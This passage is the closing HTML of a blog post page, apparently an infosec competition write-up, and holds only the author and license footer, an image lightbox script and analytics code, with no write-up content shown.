+<span class="line" data-line="18"><span style="color:#E1E4E8">plaintext</span></span></code></pre>   </section> <footer class="mt-12 pt-8 border-t border-gray-200 dark:border-gray-700"> <div class="bg-gray-50 dark:bg-gray-800 p-6 rounded-lg text-sm text-gray-700 dark:text-gray-300 space-y-2 relative overflow-hidden transition-colors duration-300">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none text-gray-600 dark:text-gray-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" aria-hidden="true"> <path fill="currentColor" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10 space-y-2"> <div> <strong>本文作者：</strong> <span>iami233</span> </div> <div> <strong>本文链接：</strong> <a href="https://5ime.cn/nb-infosec-2023/index.html" target="_blank" rel="noopener" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 break-all transition-colors duration-300"> https://5ime.cn/nb-infosec-2023/index.html </a> </div> <div> <strong>版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/cn/" target="_blank" rel="noopener noreferrer" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 transition-colors duration-300">
+CC BY-NC-SA 4.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> </footer> <div id="waline" class="transition-colors duration-300"></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.E9FPFjnB.js"></script>  </div> <div id="custom-lightbox" class="lightbox" style="display: none;" data-astro-cid-vqtgpguw>  <div id="lightbox-images" data-astro-cid-vqtgpguw></div> <div class="toolbar" data-astro-cid-vqtgpguw> <div class="counter" data-astro-cid-vqtgpguw> <span data-astro-cid-vqtgpguw><b id="current" data-astro-cid-vqtgpguw>1</b>/<span id="total" data-astro-cid-vqtgpguw>0</span></span> </div> <div class="nav" data-astro-cid-vqtgpguw> <div class="btn" id="prev" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M31 36L19 24L31 12" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> <div class="btn" id="next" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M19 12L31 24L19 36" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> <div class="btn" id="close" data-astro-cid-vqtgpguw> <svg width="16" height="16" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M8 8L40 40M8 40L40 8" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> </div> <script type="module">class o{index=0;images=[];elements;constructor(){this.elements={lightbox:document.getElementById("custom-lightbox"),container:document.getElementById("lightbox-images"),prev:document.getElementById("prev"),next:document.getElementById("next"),close:document.getElementById("close"),current:document.getElementById("current"),total:document.getElementById("total")},this.init()}init(){this.elements.prev.onclick=()=>this.navigate(-1),this.elements.next.onclick=()=>this.navigate(1),this.elements.close.onclick=()=>this.close(),this.elements.lightbox.onclick=e=>{e.target===this.elements.lightbox&&this.close()},document.onkeydown=e=>{this.elements.lightbox.style.display==="flex"&&(e.key==="ArrowLeft"?this.navigate(-1):e.key==="ArrowRight"?this.navigate(1):e.key==="Escape"&&this.close())}}open(e,t=0){this.images=e,this.index=t,this.render(),this.elements.lightbox.style.display="flex",this.elements.lightbox.classList.remove("exit"),document.body.style.overflow="hidden"}navigate(e){const t=this.index+e;t>=0&&t<this.images.length&&(this.index=t,this.render())}render(){const{src:e,alt:t}=this.images[this.index],i=new Image;i.onload=()=>{this.elements.container.innerHTML=`<img src="${e}" alt="${t}">`;const s=this.elements.container.querySelector("img");if(window.innerWidth>768){const n=window.innerWidth*.8,l=window.innerHeight*.75;(i.naturalWidth>n||i.naturalHeight>l)&&(s.style.maxWidth=`${n}px`,s.style.maxHeight=`${l}px`)}requestAnimationFrame(()=>s.classList.add("show"))},i.src=e,this.elements.current.textContent=(this.index+1).toString(),this.elements.total.textContent=this.images.length.toString(),this.elements.prev.style.opacity=this.index===0?"0.3":"1",this.elements.next.style.opacity=this.index===this.images.length-1?"0.3":"1"}close(){this.elements.lightbox.classList.add("exit"),document.body.style.overflow="",setTimeout(()=>this.elements.lightbox.style.display="none",300)}}window.customLightbox=new o;</script> </article> </main> <footer class="py-8 px-4 pb-12 text-center text-gray-700 dark:text-gray-400" role="contentinfo" aria-label="网站页脚"> <p>&copy; 2025 iami233. All rights reserved.</p> </footer> <!-- Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-8Z68BHM5GN"></script> <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-8Z68BHM5GN');
+</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("article");if(e&&window.customLightbox){const n=e.getElementsByTagName("img"),o=[];Array.from(n).forEach((t,a)=>{t.alt||(t.alt=`文章配图 ${a+1}`),o.push({src:t.src,alt:t.alt}),t.style.cursor="pointer",t.addEventListener("click",()=>{window.customLightbox.open(o,a)})})}});</script></body></html>
